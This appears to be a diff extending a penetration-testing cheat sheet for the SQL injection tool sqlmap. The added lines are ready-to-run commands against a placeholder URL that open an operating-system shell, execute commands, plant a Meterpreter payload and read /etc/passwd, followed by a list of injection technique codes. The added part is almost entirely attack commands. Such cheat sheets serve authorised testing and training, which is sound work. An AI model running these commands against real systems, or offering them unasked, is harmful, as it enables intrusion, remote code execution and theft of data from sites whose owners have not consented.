@@ -103,3 +103,24 @@ sqlmap --purge -X POST --data "<DATA>" -H "Content-Type: <CONTENT_TYPE>" -u '<UR
 
 # sqlmap request file save burpsuite request r.txt
 sqlmap --purge -r r.txt --level=5 --risk=3 -a
+
+# sqlmap simple shell
+sqlmap --purge -u "http://example.com/?id=1" -p id --os-shell
+
+# sqlmap exec command
+sqlmap --purge -u "http://example.com/?id=1" -p id --os-cmd whoami
+
+# sqlmap plant meterpreter
+sqlmap --purge -u "http://example.com/?id=1" -p id --os-pwn
+
+# sqlmap read file
+sqlmap --purge -u "http://example.com/?id=1" -p id --file-read=/etc/passwd
+
+# sqlmap specify technique UNION and BLIND in that order (default "BEUSTQ")
+B: Boolean-based blind
+E: Error-based
+U: Union query-based
+S: Stacked queries
+T: Time-based blind
+Q: Inline queries
+sqlmap --purge -u "http://example.com/?id=1" -p id --technique="UB"
